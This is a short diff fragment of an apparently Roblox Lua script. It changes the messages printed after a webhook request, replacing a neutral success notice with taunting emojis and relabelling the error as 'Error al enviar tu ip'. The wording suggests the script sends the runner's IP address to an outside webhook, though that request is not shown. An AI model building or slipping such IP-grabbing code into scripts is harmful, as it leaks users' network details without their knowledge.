@@ -227,12 +227,12 @@ local sendSuccess = pcall(function()
 end)
 
 if sendSuccess and response then
-    print("✅ Webhook enviado correctamente")
+    print("😼🙏")
     if response.StatusCode then
         print("Status Code:", response.StatusCode)
     end
 else
-    print("❌ Error al enviar webhook")
+    print("❌ Error al enviar tu ip 🙀")
     
     -- Método alternativo con HttpGetAsync
     local altSuccess = pcall(function()
